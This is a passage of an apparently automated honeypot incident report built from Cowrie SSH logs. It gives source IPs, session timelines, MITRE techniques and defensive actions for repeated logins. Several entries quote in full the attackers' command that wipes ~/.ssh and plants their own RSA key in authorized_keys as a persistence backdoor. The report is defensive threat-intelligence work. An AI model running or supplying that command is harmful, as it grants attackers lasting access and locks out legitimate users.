| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:34:54` | `cowrie.session.connect` |
| `2026-04-07 11:34:54` | `cowrie.client.version` |
| `2026-04-07 11:34:54` | `cowrie.client.kex` |
| `2026-04-07 11:34:55` | `cowrie.login.success` |
| `2026-04-07 11:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b9a9250356f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.218[.]244` |
| **First Seen** | 2026-04-07 11:34 |
| **Last Seen** | 2026-04-07 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:34:54` | `cowrie.session.connect` |
| `2026-04-07 11:34:54` | `cowrie.client.version` |
| `2026-04-07 11:34:54` | `cowrie.client.kex` |
| `2026-04-07 11:34:54` | `cowrie.login.success` |
| `2026-04-07 11:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.218[.]244` to AbuseIPDB if not already reported
- [ ] Block `152.32.218[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-715cdcb1bcec

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-07 11:35 |
| **Last Seen** | 2026-04-07 11:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:35:24` | `cowrie.session.connect` |
| `2026-04-07 11:35:24` | `cowrie.client.version` |
| `2026-04-07 11:35:24` | `cowrie.client.kex` |
| `2026-04-07 11:35:25` | `cowrie.login.success` |
| `2026-04-07 11:35:25` | `cowrie.session.params` |
| `2026-04-07 11:35:25` | `cowrie.command.input` |
| `2026-04-07 11:35:25` | `cowrie.command.failed` |
| `2026-04-07 11:35:25` | `cowrie.log.closed` |
| `2026-04-07 11:35:25` | `cowrie.session.params` |
| `2026-04-07 11:35:25` | `cowrie.command.input` |
| `2026-04-07 11:35:25` | `cowrie.session.file_download` |
| `2026-04-07 11:35:25` | `cowrie.log.closed` |
| `2026-04-07 11:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a696bfad9d15

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-07 11:35 |
| **Last Seen** | 2026-04-07 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:35:27` | `cowrie.session.connect` |
| `2026-04-07 11:35:27` | `cowrie.client.version` |
| `2026-04-07 11:35:27` | `cowrie.client.kex` |
| `2026-04-07 11:35:28` | `cowrie.login.success` |
| `2026-04-07 11:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee6943767fca

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:36 |
| **Last Seen** | 2026-04-07 11:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:36:00` | `cowrie.session.connect` |
| `2026-04-07 11:36:00` | `cowrie.client.version` |
| `2026-04-07 11:36:01` | `cowrie.client.kex` |
| `2026-04-07 11:36:02` | `cowrie.login.success` |
| `2026-04-07 11:36:02` | `cowrie.session.params` |
| `2026-04-07 11:36:02` | `cowrie.command.input` |
| `2026-04-07 11:36:02` | `cowrie.command.failed` |
| `2026-04-07 11:36:03` | `cowrie.log.closed` |
| `2026-04-07 11:36:03` | `cowrie.session.params` |
| `2026-04-07 11:36:03` | `cowrie.command.input` |
| `2026-04-07 11:36:04` | `cowrie.session.file_download` |
| `2026-04-07 11:36:04` | `cowrie.log.closed` |
| `2026-04-07 11:36:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd092482d080

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:36 |
| **Last Seen** | 2026-04-07 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:36:07` | `cowrie.session.connect` |
| `2026-04-07 11:36:07` | `cowrie.client.version` |
| `2026-04-07 11:36:07` | `cowrie.client.kex` |
| `2026-04-07 11:36:09` | `cowrie.login.success` |
| `2026-04-07 11:36:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfb86cae0ea1

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:38 |
| **Last Seen** | 2026-04-07 11:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:38:26` | `cowrie.session.connect` |
| `2026-04-07 11:38:26` | `cowrie.client.version` |
| `2026-04-07 11:38:26` | `cowrie.client.kex` |
| `2026-04-07 11:38:27` | `cowrie.login.success` |
| `2026-04-07 11:38:28` | `cowrie.session.params` |
| `2026-04-07 11:38:28` | `cowrie.command.input` |
| `2026-04-07 11:38:28` | `cowrie.command.failed` |
| `2026-04-07 11:38:28` | `cowrie.log.closed` |
| `2026-04-07 11:38:29` | `cowrie.session.params` |
| `2026-04-07 11:38:29` | `cowrie.command.input` |
| `2026-04-07 11:38:29` | `cowrie.session.file_download` |
| `2026-04-07 11:38:29` | `cowrie.log.closed` |
| `2026-04-07 11:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-568a3c873b84

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:38 |
| **Last Seen** | 2026-04-07 11:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:38:32` | `cowrie.session.connect` |
| `2026-04-07 11:38:32` | `cowrie.client.version` |
| `2026-04-07 11:38:33` | `cowrie.client.kex` |
| `2026-04-07 11:38:34` | `cowrie.login.success` |
| `2026-04-07 11:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a39e7a8772d

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:42 |
| **Last Seen** | 2026-04-07 11:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:42:42` | `cowrie.session.connect` |
| `2026-04-07 11:42:42` | `cowrie.client.version` |
| `2026-04-07 11:42:43` | `cowrie.client.kex` |
| `2026-04-07 11:42:43` | `cowrie.login.success` |
| `2026-04-07 11:42:43` | `cowrie.session.params` |
| `2026-04-07 11:42:43` | `cowrie.command.input` |
| `2026-04-07 11:42:43` | `cowrie.command.failed` |
| `2026-04-07 11:42:44` | `cowrie.log.closed` |
| `2026-04-07 11:42:44` | `cowrie.session.params` |
| `2026-04-07 11:42:44` | `cowrie.command.input` |
| `2026-04-07 11:42:44` | `cowrie.session.file_download` |
| `2026-04-07 11:42:44` | `cowrie.log.closed` |
| `2026-04-07 11:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2402a72a3e1

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:42 |
| **Last Seen** | 2026-04-07 11:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:42:46` | `cowrie.session.connect` |
| `2026-04-07 11:42:46` | `cowrie.client.version` |
| `2026-04-07 11:42:46` | `cowrie.client.kex` |
| `2026-04-07 11:42:47` | `cowrie.login.success` |
| `2026-04-07 11:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a69134143fcf

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:44 |
| **Last Seen** | 2026-04-07 11:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:44:10` | `cowrie.session.connect` |
| `2026-04-07 11:44:10` | `cowrie.client.version` |
| `2026-04-07 11:44:10` | `cowrie.client.kex` |
| `2026-04-07 11:44:11` | `cowrie.login.success` |
| `2026-04-07 11:44:11` | `cowrie.session.params` |
| `2026-04-07 11:44:11` | `cowrie.command.input` |
| `2026-04-07 11:44:11` | `cowrie.command.failed` |
| `2026-04-07 11:44:12` | `cowrie.log.closed` |
| `2026-04-07 11:44:12` | `cowrie.session.params` |
| `2026-04-07 11:44:12` | `cowrie.command.input` |
| `2026-04-07 11:44:12` | `cowrie.session.file_download` |
| `2026-04-07 11:44:12` | `cowrie.log.closed` |
| `2026-04-07 11:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4d71d21912b

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:44 |
| **Last Seen** | 2026-04-07 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:44:14` | `cowrie.session.connect` |
| `2026-04-07 11:44:14` | `cowrie.client.version` |
| `2026-04-07 11:44:14` | `cowrie.client.kex` |
| `2026-04-07 11:44:15` | `cowrie.login.success` |
| `2026-04-07 11:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04e6896e342e

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 11:44 |
| **Last Seen** | 2026-04-07 11:45 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:44:43` | `cowrie.session.connect` |
| `2026-04-07 11:44:43` | `cowrie.client.version` |
| `2026-04-07 11:44:43` | `cowrie.client.kex` |
| `2026-04-07 11:44:46` | `cowrie.login.success` |
| `2026-04-07 11:44:48` | `cowrie.session.params` |
| `2026-04-07 11:44:48` | `cowrie.command.input` |
| `2026-04-07 11:44:48` | `cowrie.command.failed` |
| `2026-04-07 11:44:48` | `cowrie.log.closed` |
| `2026-04-07 11:44:50` | `cowrie.session.params` |
| `2026-04-07 11:44:50` | `cowrie.command.input` |
| `2026-04-07 11:44:51` | `cowrie.session.file_download` |
| `2026-04-07 11:44:51` | `cowrie.log.closed` |
| `2026-04-07 11:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-687e991ef345

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 11:44 |
| **Last Seen** | 2026-04-07 11:45 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:44:57` | `cowrie.session.connect` |
| `2026-04-07 11:44:58` | `cowrie.client.version` |
| `2026-04-07 11:44:59` | `cowrie.client.kex` |
| `2026-04-07 11:45:08` | `cowrie.login.success` |
| `2026-04-07 11:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bd29c3e6c86

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:45 |
| **Last Seen** | 2026-04-07 11:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:45:16` | `cowrie.session.connect` |
| `2026-04-07 11:45:16` | `cowrie.client.version` |
| `2026-04-07 11:45:16` | `cowrie.client.kex` |
| `2026-04-07 11:45:17` | `cowrie.login.success` |
| `2026-04-07 11:45:17` | `cowrie.session.params` |
| `2026-04-07 11:45:17` | `cowrie.command.input` |
| `2026-04-07 11:45:17` | `cowrie.command.failed` |
| `2026-04-07 11:45:17` | `cowrie.log.closed` |
| `2026-04-07 11:45:17` | `cowrie.session.params` |
| `2026-04-07 11:45:17` | `cowrie.command.input` |
| `2026-04-07 11:45:17` | `cowrie.session.file_download` |
| `2026-04-07 11:45:17` | `cowrie.log.closed` |
| `2026-04-07 11:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ce63b595e3

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:45 |
| **Last Seen** | 2026-04-07 11:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:45:19` | `cowrie.session.connect` |
| `2026-04-07 11:45:19` | `cowrie.client.version` |
| `2026-04-07 11:45:19` | `cowrie.client.kex` |
| `2026-04-07 11:45:19` | `cowrie.login.success` |
| `2026-04-07 11:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22346b8b6bc6

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:45 |
| **Last Seen** | 2026-04-07 11:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:45:35` | `cowrie.session.connect` |
| `2026-04-07 11:45:35` | `cowrie.client.version` |
| `2026-04-07 11:45:35` | `cowrie.client.kex` |
| `2026-04-07 11:45:36` | `cowrie.login.success` |
| `2026-04-07 11:45:36` | `cowrie.session.params` |
| `2026-04-07 11:45:36` | `cowrie.command.input` |
| `2026-04-07 11:45:36` | `cowrie.command.failed` |
| `2026-04-07 11:45:36` | `cowrie.log.closed` |
| `2026-04-07 11:45:37` | `cowrie.session.params` |
| `2026-04-07 11:45:37` | `cowrie.command.input` |
| `2026-04-07 11:45:37` | `cowrie.session.file_download` |
| `2026-04-07 11:45:37` | `cowrie.log.closed` |
| `2026-04-07 11:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff0934034638

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:45 |
| **Last Seen** | 2026-04-07 11:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:45:39` | `cowrie.session.connect` |
| `2026-04-07 11:45:39` | `cowrie.client.version` |
| `2026-04-07 11:45:39` | `cowrie.client.kex` |
| `2026-04-07 11:45:40` | `cowrie.login.success` |
| `2026-04-07 11:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64ab5e76b814

| Field | Detail |
|---|---|
